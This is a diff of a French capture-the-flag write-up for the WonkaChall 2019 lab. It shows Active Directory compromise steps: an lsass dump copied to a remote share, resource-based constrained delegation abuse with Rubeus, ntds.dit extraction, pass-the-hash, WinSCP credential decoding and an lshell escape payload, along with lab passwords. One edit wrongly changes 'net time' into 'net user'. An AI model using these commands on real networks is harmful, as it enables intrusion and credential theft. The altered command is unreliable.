-L'exécution de __procdump.exe__ se fait comme pour _netcat_ : via les UNC path.
+L'éxecution de __procdump.exe__ se fera comme pour _netcat_ : via les UNC path.
 
 ```bash
 (SRV01-INTRANET) ➜ \\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
@@ -1058,7 +1057,7 @@ L'exécution de __procdump.exe__ se fait comme pour _netcat_ : via les UNC path.
 _Fig 21_ : Récupérer le minidump de lsass.exe
 </center>
 
-Toujours avec les UNC path, on copie les fichiers sur un partage distant :
+Toujours avec les UNC path, il est possible de copier des fichiers sur un partage distant :
 
 ```bash
 (SRV01-INTRANET) ➜ copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
@@ -1141,7 +1140,7 @@ Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les ide
 
 ### TL;DR
 
-1. Essayer d'accéder aux partages du réseau avec les identifiants récupérés ;
+1. Essayer d'accéder aux partages du réseau avec identifiants récupérés ;
 2. Trouver le partage __Users__ sur le serveur `172.16.42.5` ;
 3. Le parcourir et trouver les identifiants : `factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?`.
 
@@ -1149,7 +1148,7 @@ Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les ide
 
 ### VII.1. Reconnaissance
 
-Dans les scans réalisés lors de l'étape 5 (cf. V.1. Reconnaissance), on remarque que toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échoué, on peut réitérer les tests avec les identifiants de __adminServer__. 
+Dans les scans réalisés dans l'étape 5 (cf. V.1. Reconnaissance), toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échouées, on peut réitérer les tests avec les identifiants de __adminServer__. 
 
 L'outil __CrackMapExec__ (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d'IP :
 
@@ -1198,7 +1197,7 @@ smb: \> ls
 		12966143 blocks of size 4096. 9273442 blocks available
 ```
 
-Il est également possible de le monter en local. D'un point de vue personnel, je préfère cette méthode car je trouve qu'elle rend plus simple la navigation dans le partage :
+Il est également possible de le monter en local. D'un point de vue personnel je préfère cette méthode, c'est plus simple pour naviguer dans le partage :
 
 ```bash
 (KaliVM) ➜ mkdir /tmp/a
@@ -1251,11 +1250,11 @@ QueStC3qU!esTpetItEtMarr0N?
 
 1. Faire un `bloodhound` avec le compte __adminServer__ ;
 2. Remarquer la relation __AddAllowedToAct__ entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ ;
-3. Grâce à la note précédente et à la relation trouvée, comprendre qu'il faut abuser du __resources based constrained delegation__ ;
-4. Ajouter de la CommandoVM dans le domaine grâce au compte de service (_SvcJoinComputerToDom_) ;
+3. Entre la note précédente et la relation trouvée, comprendre qu'il faut abuser du __resources based constrained delegation__ ;
+4. Ajout de la CommandoVM dans le domaine grâce au compte de service (_SvcJoinComputerToDom_) ;
 5. Créer un SPN et modifier sa valeur de `msDS-AllowedToActOnBehalfOfOtherIdentity` ;
-6. Abuser du mécanisme __S4U__ (_S4U2User_ et _S4U2Proxy_) avec Rubeus pour usurper l'identité de l'administrateur de domaine ;
-7. Lorsque Rubeus a forgé le ticket de l'administrateur, utiliser __psexec__ sur le contrôleur de domaine ;
+6. Abuser du mécanisme __S4U__ (_S4U2User_ et _S4U2Proxy_) avec Rubeus pour impersonate l'administrateur de domaine ;
+7. Lorsque Rubeus a forgé le ticket de l'administrateur, il est possible d'utiliser __psexec__ sur le contrôleur de domaine ;
 8. Extraire le `ntds.dit` en utilisant `vssadmin` sur le contrôleur de domaine ;
 9. Copier le fichier généré sur une de nos machines et utiliser __secretdumps.py__ afin de récupérer les différents hash, dont celui de `krbtgt`.
 
@@ -1263,24 +1262,24 @@ QueStC3qU!esTpetItEtMarr0N?
 
 ### VIII.1. Reconnaissance
 
-Cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes disponibles : un compte utilisateur du domaine (_adminServer_) et un compte de service (_SvcJoinComputerToDom_).
+Tout d'abord, cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes de disponibles : un compte utilisateur du domaine (_adminServer_) et un compte de service (_SvcJoinComputerToDom_).
 
-La première idée consiste à faire un bloodhound avec le compte utilisateur du domaine. __Bloodhound__ est un outil de cartographie d'Active Directory. Il permet de visualiser le domaine sous forme de graphes et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes ...). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter.
+La première idée est de faire un bloodhound avec le compte utilisateur du domaine. __Bloodhound__ est un outil de cartographie d'Active Directory. Il permet de visualiser le domaine sous forme de graphe et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes ...). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter.
 
-_Note_ : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités. Ne pas oublier de récupérer la dernière version avant de partir en test interne.
+_Note_ : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités, ne pas oublier de récupérer la dernière version avant de partir en test interne.
 
-_BloodHound_ permet de visualiser les données, mais le collecteur s'appelle __SharpHound__. Il se situe dans le même dépôt, dans le dossier "Ingestors". Avant de l'utiliser, il faut ajouter l'adresse IP du contrôleur de domaine en tant que serveur DNS principal afin de pouvoir accéder au domaine :
+_BloodHound_ permet de visualiser la données, mais le collecteur s'appelle __SharpHound__. Il se situe dans le même dépôt dans le dossier "Ingestors". Avant de l'utiliser, il faut ajouter l'adresse IP du contrôleur de domaine en tant que serveur DNS principal, afin d'accéder au domaine :
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_dns.png)
 _Fig 23_ : Adresse IP du serveur DNS (DC)
 </center>
 
-_Note_ : Comme présenté sur le schéma dans l'introduction, CommandoVM est configuré en NAT. La seconde IP correspond à l'IP de mon hôte sur l'interface virtuelle.
+_Note_ : Comme présenté dans le schéma situé dans l'introduction, CommandoVM est en NAT. La seconde IP correspond à l'IP de mon hôte sur l'interface virtuelle.
 
 #### VIII.1.a BloodHound
 
-Lorsque cette étape est réalisée, _CommandoVM_ est en mesure de ping le domaine `factory.lan`. _SharpHound_ peut alors être executé à l'aide de la commande suivante :
+Lorsque cette étape est réalisée, _CommandoVM_ est en mesure de ping le domaine `factory.lan`. _SharpHound_ peut être executé à l'aide de la commande suivante :
 
 ```bash
 (CommandoVM) ➜ .\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn
@@ -1297,13 +1296,11 @@ Cette relation est mentionnée sur le blog de _CptJesus_. Le blogpost montre l'i
 
 Pour reprendre ce qu'a dit __Pixis__ sur son blog au sujet de cette attaque (cf. Ressource 4 : _Resource-Based Constrained Delegation - Risques_) : 
 
-> Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaîne qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.
+> Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaine qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.
 
-La ressource finale, s'occupant de l'authentification, utilise une "whitelist". Cette liste contient tous les comptes de confiance et est stockée dans un attribut appelé `msDS-AllowedToActOnBehalfOfOtherIdentity`. Toujours en paraphrasant l'article de __Pixis__, dans le cas où un utilisateur s'authentifierait sans utiliser Kerberos, alors le compte de service censé "impersonate" l'utilisateur n'aurait pas de TGS. C'est à ce moment que le compte de service fait une demande de TGS au nom de l'utilisateur désirant se connecter au KDC. Ce mécanisme s'appelle le __S4U2Self__. Si le TGS de l'utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme __S4U2Proxy__.
+La ressource finale, s'occupant de l'authentification, a une "whitelist". Cette liste contient tous les comptes de confiance et est stocké dans un attribut appelé `msDS-AllowedToActOnBehalfOfOtherIdentity`. Toujours en paraphrasant l'article de __Pixis__, dans le cas où un utilisateur s'authentifie sans utiliser Kerberos, alors le compte de service qui est censé "impersonate" l'utilisateur n'aura pas de TGS. Cest à ce moment que le compte de service fera une demande de TGS au nom de l'utilisateur désirant se connecter au KDC. Ce mécanisme s'appelle le __S4U2Self__. Lorsque que le TGS de l'utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme __S4U2Proxy__.
 
-Cependant, si un compte machine fait la demande d'un TGS sans l'attribut `TrustedToAuthForDelegation`, alors le TGS reçu sera _non transférable_. Malgré tout, lors de la demande de TGS pour une ressource via __S4U2Proxy__, cette demande sera validée.
-
-J'invite toutes les personnes intéressées par ce genre d'attaque à lire les articles de __Pixis__ sur _hackndo.com_, __SpecterOps__, __harmj0y__ et  __shenaniganslabs__. Les différents liens sont disponibles dans les ressources.
+Cependant, si un compte machine fait la demande d'un TGS sans l'attribut `TrustedToAuthForDelegation`, alors le TGS reçu sera _non transférable_. Malgré tout, lors de la demande de TGS pour une ressource via __S4U2Proxy__, cette demande sera validée. J'invite toutes les personnes intéressées par ce genre d'attaque à lire les articles de __Pixis__ sur _hackndo.com_, __SpecterOps__, __harmj0y__ et  __shenaniganslabs__. Les différents liens sont disponibles dans les ressources.
 
 Ayant tout ceci en tête, l'article de _CptJesus_ semble plus clair. Ce même article mentionne deux conditions pour réussir ce genre d'attaque : 
 
@@ -1312,7 +1309,7 @@ Ayant tout ceci en tête, l'article de _CptJesus_ semble plus clair. Ce même ar
 
 Cette attaque va permettre d'accéder au contrôleur de domaine en tant qu'administrateur de domaine. 
 
-Dans notre cas, ces prérequis sont remplis. La relation que BloodHound a trouvé entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ permet de réécrire l'attribut `msds-AllowedToActOnBehalfOfOtherIdentity`. Quant au contrôle d'un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note __credentials.txt__, on sait que le compte _SvcJoinComputerToDom_ possède cette fonction.
+Enfin, ces prérequis sont rempli dans notre cas. La relation que BloodHound a trouvé entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ permet de réécrire l'attribut `msds-AllowedToActOnBehalfOfOtherIdentity`. Quant au contrôle d'un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note __credentials.txt__, on sait que le compte _SvcJoinComputerToDom_ à cette fonction.
 
 ### VIII.2. Mise en place de l'exploitation
 
@@ -1323,16 +1320,16 @@ La reconnaissance étant terminée, le moment est venu d'exploiter cette vulnér
 _Fig 24_ : Connexion de CommandoVM au domaine FACTORY.LAN
 </center>
 
-_Note_ : Lorsque que l'ajout de la machine a été validé par le domaine, notre Windows nous demande de choisir un type de compte pour _SvcJoinComputerToDom_. Pour être sûr de ne pas être embêté, j'ai choisi de le mettre en administrateur local.
+_Note_ : Lorsque que l'ajout de la machine a été validée par le domaine, notre Windows demande quel type de compte devra être _SvcJoinComputerToDom_. Pour être sûre de pas être embêté, je l'ai mis administrateur local.
 
-Pour s'assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l'aide de la commande suivante : `net user /dom`
+Afun de s'assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l'aide de la commande suivante : `net user /dom`
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_domainuser.png)
 _Fig 25_ : Liste des utilisateurs du domaine
 </center>
 
-Harmj0y a écrit un [article](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/) détaillé sur cette attaque et a même fournit un [script](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff) en powershell pour l'automatiser. Son script a besoin de deux librairies pour fonctionner : [PowerView dans la branche dev](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) et [PowerMad](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1).
+Harmj0y a écrit un [article](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/) détaillé sur cette attaque. Il a même fournit un [script](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff) en powershell pour l'automatiser. Son script a besoin de deux librairies pour fonctionner : [PowerView dans la branche dev](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) et [PowerMad](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1).
 
 #### VIII.2.a. Vérification des droits sur le domaine
 
@@ -1364,11 +1361,11 @@ Afin de remplir la seconde condition, il est possible d'ajouter une machine au d
 [+] Machine account attackersystem added
 ```
 
-_Note_ : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c'est le __MachineAccountQuota__. Dans notre cas, ce n'est pas important car nous disposons d'un compte spécifique pour l'ajout de machine dans le domaine.
+_Note_ : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c'est le __MachineAccountQuota__. Dans notre cas ce n'est pas important, car nous disposons d'un compte spécifique pour l'ajout de machine dans le domaine.
 
 #### VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity  
 
-Harmj0y explique dans son article que même lui n'a pas complètement compris la structure de __msDS-AllowedToActOnBehalfOfOtherIdentity__. Pour modifier cette structure, il a donc extrait le champ désiré et l'a converti au format __Security Descriptor Definition Language__ (SDDL). Ce format est utilisé pour convertir les descripteurs de sécurité en chaînes de caractère. Il est alors possible de remplacer le SID par celui du SPN contrôlé. Une fois la structure correctement modifiée, il suffit de faire la conversion inverse et de l'enregistrer dans le champ __msDS-AllowedToActOnBehalfOfOtherIdentity__.
+Harmj0y explique dans son article que même lui n'a pas complètement compris la structure de __msDS-AllowedToActOnBehalfOfOtherIdentity__. Pour modifier cette structure, il a donc extrait le champ désiré et converti au format __Security Descriptor Definition Language__ (SDDL). Ce format est utilisé pour convertir les descripteur de sécurité en chaine de caractère. De ce fait, il est possible de modifier le SID par celui du SPN contrôlé. Lorsque la structure est correctement modifiée, il est nécessaire de faire la conversion inverse et l'enregistrer dans le champ __msDS-AllowedToActOnBehalfOfOtherIdentity__.
 
 ```bash
 (CommandoVM) ➜ $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
@@ -1386,15 +1383,17 @@ Harmj0y explique dans son article que même lui n'a pas complètement compris la
 _Fig 27_ : AccessAllowed
 </center>
 
-La figure 27 ci-dessus démontre que tous les prérequis de l'exploitation ont été mis en place avec succès.
+La figure 27 ci-dessus démontre que tous les prérequis de l'exploitation sont mis en place avec succès.
 
 ### VIII.3. Exploitation
 
-Pour rappel, l'exploitation se fait en abusant des mécanismes __S4U2Self__ et __S4U2Proxy__. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est développé par GentilKiwi - aka Benjamin Delpy -, qui est aussi le développeur de Mimikatz. Le second est développé par harmj0y. Les deux outils sont assez similaires. Harmj0y a expliqué pourquoi il a développé Rubeus dans un [article](https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/) sur son blog.
+Pour rappel, l'exploitation se fait en abusant des mécanismes __S4U2Self__ et __S4U2Proxy__. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est developpé par GentilKiwi aka Benjamin Delpy, qui est aussi le développeur de Mimikatz. Le second est est développé par harmj0y. Les deux outils sont assez similaire. Harmj0y a expliqué pourquoi il a développé Rubeus dans un [article](https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/) sur son blog.
 
-_Note_ : Par défaut, Rubeus n'est pas dans CommandoVM. Cependant,Visual Studio est installé, il suffit donc de compiler le projet disponible sur le GitHub.
+_Note_ : Par défaut, Rubeus n'est pas dans CommandoVM. Cependant, Visual Studio est installé, il suffit de compiler le projet disponible sur le GitHub.
 
-Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte :
+#### VIII.3.a. Abus de S4U2Self / S4U2Proxy
+
+Pour abuser de ces mécanismes, Rubeus prend différents paramètres :
 
 * /user : Le SPN que nous contrôlons ;
 * /rc4 : Le mot de passe de ce compte au format RC4 ;
@@ -1402,7 +1401,7 @@ Pour abuser de ces mécanismes, Rubeus prend différents paramètres en compte :
 * /msdsspn : Le service désiré sur le serveur désiré ;
 * /ptt : Pass the ticket.
 
-Le seul paramètre manquant est le mot de passe de __attackersystem$__ au format RC4. Heureusement, Rubeus nous permet de le récupérer :
+Le seul paramètre manquant est le mot de passe de __attackersystem$__ au format RC4. Heureusement, Rubeus permet de le récupérer :
 
 ```bash
 (CommandoVM) ➜ .\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:factory.lan
@@ -1411,28 +1410,28 @@ rc4_hmac : EF266C6B963C0BB683941032008AD47F
 [...]
 ```
 
-Ayant tous les paramètres, il est temps d'abuser de ces mécansimes... Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l'ensemble des machines à leur état d'origine toute les heures, causant ainsi l'erreur suivante :
+Ayant tous les paramètres, il est temps d'abuser de ces mécansimes... Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l'ensemble des machines à leur état d'origine, et ceux toute les heures. Causant ainsi l'erreur suivante :
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_kerberos_issue.png)
 _Fig 28_ : Erreur Kerberos
 </center>
 
-L'erreur __KRB_AP_ERR_SKEW__ signifie _Kerberos Authentication failed due to time skew_. Cette erreur survient lorsque l'horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l'horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : `net time /domain /set`.
+L'erreur __KRB_AP_ERR_SKEW__ signifie _Kerberos Authentication failed due to time skew_. Cette erreur survient lorsque l'horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l'horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : `net user /domain /set`.
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_issue_done.png)
-_Fig 29_ : Erreur corrigée et exécution de Rubeus
+_Fig 29_ : Erreur corrigé et exécution de Rubeus
 </Center>
 
-La commande Rubeus s'étant terminée correctement, un ticket __Administrator @ factory.lan__ a été créé en mémoire :
+La commande Rubeus étant terminée correctement, un ticket __Administrator @ factory.lan__ a été créé en mémoire :
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_rubeus_ticket.png)
 _Fig 30_ : Ticket Kerberos de l'administrateur de domaine
 </center>
 
-Le ticket "administrateur de domaine" étant désormais en mémoire, il est possible d'accéder au disque __C:__ du contrôleur de domaine :
+Le ticket "administrateur de domaine" étant én mémoire, il est possible d'accéder au disque __C:__ du contrôleur de domaine :
 
 <center>
 ![](/img/writeups/wonkachall2019/step8_dir_allowed_on_dc.png)
@@ -1447,7 +1446,7 @@ Ayant les droits administrateur de domaine, il est possible de se connecter au c
 PsExec.exe \\dc01-ww2.factory.lan cmd.exe
 ```
 
-Il n'est pas possible d'accéder au fichier __ntds.dit__ sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d'utiliser __vssadmin__ pour récupérer une copie du disque __C:__ et ainsi récupérer le _ntds.dit_ dans cet instantané :
+Il n'est pas possible d'accéder au fichier __ntds.dit__ sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d'utiliser __vssadmin__ pour récupérer une copie du disque __C:__ et ainsi récupérer le _ntds.dit_ dans cet instantanné :
 
 ```bash
 vssadmin create shadow /for=C:
@@ -1490,7 +1489,7 @@ L'outil __secretsdump.py__ est un script de la suite _impacket_. Dans le cadre d
 _Fig 34_ : Extracting hash
 </center>
 
-Le flag est le sha256 du hash de l'utilisateur __krbtgt__. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu'administrateur de domaine.
+Le flag étant le sha256 du hash de l'utilisateur __krbtgt__. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu'administrateur de domaine.
 
 ### VIII.5. Flag
 
@@ -1533,9 +1532,9 @@ Le flag est le sha256 du hash de l'utilisateur __krbtgt__. Ayant ce hash, il est
 
 ### IX.1. Pass the hash
 
-Ne restant qu'une machine dans le réseau et possédant l'ensemble des hash des utilisateurs du domaine, nous sommes en droit de nous dire qu'il existe un lien entre les deux. En effet, il est possible de se connecter à différents services d'un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.
+Ne restant qu'une machine dans le réseau et ayant l'ensemble des hash des utilisateurs du domaine, nous sommes en droit de se dire qu'il y a un lien entre les deux. En effet, il est possible de se connecter à différents services d'un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.
 
-En filtrant les utilisateurs contenant "admin" dans le nom, le bruteforce est relativement rapide :
+En filtrant sur les utilisateurs contenant "admin" dans le nom, le bruteforce a été relativement rapide :
 
 ```bash
 (KaliVM) ➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
@@ -1581,7 +1580,7 @@ Des raccourcis intéressants sont accessibles dans les fichiers de l'utilisateur
                2 Dir(s)  11,220,193,280 bytes free
 ```
 
-Il est possible de récupérer des informations dans la registry Windows s'il n'y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode "à la main" et une méthode automatisée.
+Il est possible de récupérer des informations dans la registry Windows s'il n'y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode "à la main" et une automatisée.
 
 #### IX.2.a. Méthode 1 - À la main
 
@@ -1589,10 +1588,10 @@ Il est possible de récupérer des informations dans la registry Windows s'il n'
 
 <center>
 ![](/img/writeups/wonkachall2019/step9_regquery.png)
-_Fig 36_ : Obtention des identifiants et de l'IP de Veruca 1/2
+_Fig 35_ : Obtention des identifiants et IP de Veruca 1/2
 </center>
 
-Un [binaire](https://github.com/anoopengineer/winscppasswd/releases) sur GitHub permet de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :
+Il existe un [binaire](https://github.com/anoopengineer/winscppasswd/releases) sur GitHub permettant de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :
 
 ```bash
 (CommandoVM) ➜ .\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE
@@ -1604,7 +1603,7 @@ CuiiiiYEE3r3!
 
 Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce. Une fois que l'épreuve ait été validée, évidemment ;)
 
-L'outil _CrackMapExec_ possède un module __invoke_sessiongopher__ permettant de récupérer des informations sensibles dans différents programmes tels que PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP en utilisant _SessionGopher_.
+L'outil _CrackMapExec_ possède un module __invoke_sessiongopher__ permettant de récupérer des informations sensibles dans différents programmes tel que : PuTTY, WinSCP, FileZilla, SuperPuTTY, et RDP en utilisant _SessionGopher_.
 
 ```bash
 (KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
@@ -1612,16 +1611,16 @@ L'outil _CrackMapExec_ possède un module __invoke_sessiongopher__ permettant de
 
 <center>
 ![](/img/writeups/wonkachall2019/step9_cme_veruca.png)
-_Fig 37_ : Obtention des identifiants et de l'IP de Veruca 2/2
+_Fig 36_ : Obtention des identifiants et IP de Veruca 2/2
 </center>
 
 ### IX.3. Connexion SSH sur le poste de Veruca
 
-Les informations de Veruca sont donc les suivantes :
+Les informations de Veruca sont donc le suivants :
 
 > veruca@172.16.69.78 : CuiiiiYEE3r3!
 
-Un rapide coup d'œil sur l'adresse IP montre qu'elle fait partie d'un autre réseau. Jusqu'à présent nous étions sur le réseau __172.16.42.0/24__. Afin d'accéder au second réseau, l'ajout d'une route est nécessaire. Comme présenté dans le schéma situé dans l'introduction, ma route sera sur mon hôte Windows 10 :
+Un rapide coup d'oeil sur l'adresse IP montre qu'elle fait parti d'un autre réseau. Jusqu'à présent nous étions le réseau __172.16.42.0/24__. Afin d'accéder au second réseau, l'ajout d'une route est nécessaire. Comme présenté dans le schéma situé dans l'introduction, ma route sera sur mon hôte Windows 10 :
 
 ```bash
 (HoteWin10) ➜ route print |findstr 10.8.0.10
@@ -1668,7 +1667,7 @@ SRV01-WEB-WW3
 
 <center>
 ![](/img/writeups/wonkachall2019/step9_flag.png)
-_Fig 38_ : SSH connection and flag
+_Fig 37_ : SSH connection and flag
 </center>
 
 ### IX.4. Flag
@@ -1694,11 +1693,11 @@ _Fig 38_ : SSH connection and flag
 ### TL;DR
 
 1. Trouver l'autre machine via ARP : `cat /proc/net/arp` ;
-2. Remarquer que __nginx__ est installé ;
+2. Remarquer qu'il y a __nginx__ installé ;
 3. Dans la configuration du nginx, trouver la racine du _frontend_ : `/usr/share/nginx/dev3.challenge.akerva.com` ;
-4. Récupérer une clé privée SSH dans l'un des dossiers ;
+4. Récupérer une clé privé SSH dans l'un des dossiers ;
 5. Grâce à l'indice de Akerva, on connait l'utilisateur de la machine distante : __violet__ ;
-6. Atterrir dans un environnement restreint : __lshell__ ;
+6. Attérir dans un environnement restreint : __lshell__ ;
 7. Trouver l'issue de sécurité sur le git permettant de s'échapper de l'environnement restreint : `echo opmd && cd () bash && cd`.
 
 ---
@@ -1714,18 +1713,18 @@ IP address       HW type     Flags       HW address            Mask     Device
 172.16.69.65     0x1         0x2         96:2e:20:a6:a0:f3     *        ens18
 ```
 
-Une nouvelle IP a été trouvé : `172.16.69.65`. Il n'est pas possible de ré-utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet.
+Une nouvelle IP a été trouvé : `172.16.69.65`. Il n'est pas possible de ré utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet.
 
 #### X.1.a. 172.16.69.65 
 
-Pour des soucis de rapidité, j'ai préféré utiliser __masscan__ plutôt que nmap.
+Pour des soucis de rapidité, __masscan__ a été préféré plutôt que nmap.
 
 ```bash
 (KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
 Discovered open port 22/tcp on 172.16.69.65                                                                     
 ```
 
-Un service sur le port 22 est disponible, le SSH en question. Il n'y a pas d'autres services.
+Un service sur le port 22 est disponible, le SSH en question. Pas d'autres services.
 
 #### X.1.b. 172.16.69.78 (SRV01-WEB-WW3)
 
@@ -1739,14 +1738,14 @@ Discovered open port 22/tcp on 172.16.69.78
 
 ### X.2. Connexion SSH au serveur distant
 
-Etant donné qu'un service web est exposé et qu'un accès ssh est disponible, il est possible de lister directement le contenu de `/var/www/html` :
+Etant donné qu'il y a un service web exposé et qu'un accès ssh est disponible; il est possible de lister directement le contenu de `/var/www/html` :
 
 ```bash
 (SRV01-WEB-WW3) ➜ ls /var/www/html
 index.html  index.nginx-debian.html
 ```
 
-À première vue, le serveur utilisé est un _nginx_. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier `/etc/nginx/sites-available` :
+À première vue, le serveur utilisé est du _nginx_. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier `/etc/nginx/sites-available` :
 
 ```bash
 (SRV01-WEB-WW3) ➜ ls /etc/nginx/sites-available
@@ -1818,20 +1817,20 @@ drwxr-xr-x 6 root     root     4096 juil.  5 11:08 ..
 -rw-r----- 1 www-data www-data 1679 juin  26 18:02 id_rsa
 ```
 
-Une clé privée SSH est disponible dans l'arborescence du _frontend_. La connexion à l'autre machine doit être possible avec cette clé. Il ne manque que l'utilisateur associé. La clé privée est disponible [ici](https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w).
+Une clé privé SSH est disponible dans l'arborescence du _frontend_. La connexion à l'autre machine doit être possible avec cette clé. Il ne manque que l'utilisateur associé. La clé privé est disponible [ici](https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w)
 
 La plateforme de challenge du [WonkaChall](https://challenge.akerva.com) propose un hint par épreuve. Pour cette étape, le hint est le nom de l'utilisateur, à savoir __violet__.
 
-Connaissant le nom de l'utilisateur et la clé associée, il est possible de se connecter au serveur distant :
+Connaissant l'utilisateur et la clé associée, il est possible de se connecter au serveur distant :
 
 <center>
 ![](/img/writeups/wonkachall2019/step10_lshell.png)
-_Fig 39_ : SSH connection and restricted shell
+_Fig 38_ : SSH connection and restricted shell
 </center>
 
 ### X.3. Escaping the restricted shell
 
-Dans la réalité, le shell restreint n'est pas apparu directement. En utilisant _zsh_, j'ai rencontré un soucis (dont j'ignore totalement la cause). Par contre, cela m'a permis d'accéder à l'erreur suivante :
+Dans la réalité, le shell restreint n'est pas apparu directement. Utilisant _zsh_, il y avait un soucis (dont j'ignore totalement la cause). Par contre, cela m'a permis d'accéder à l'erreur suivante :
 
 ```bash
 (KaliVM) ➜ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa
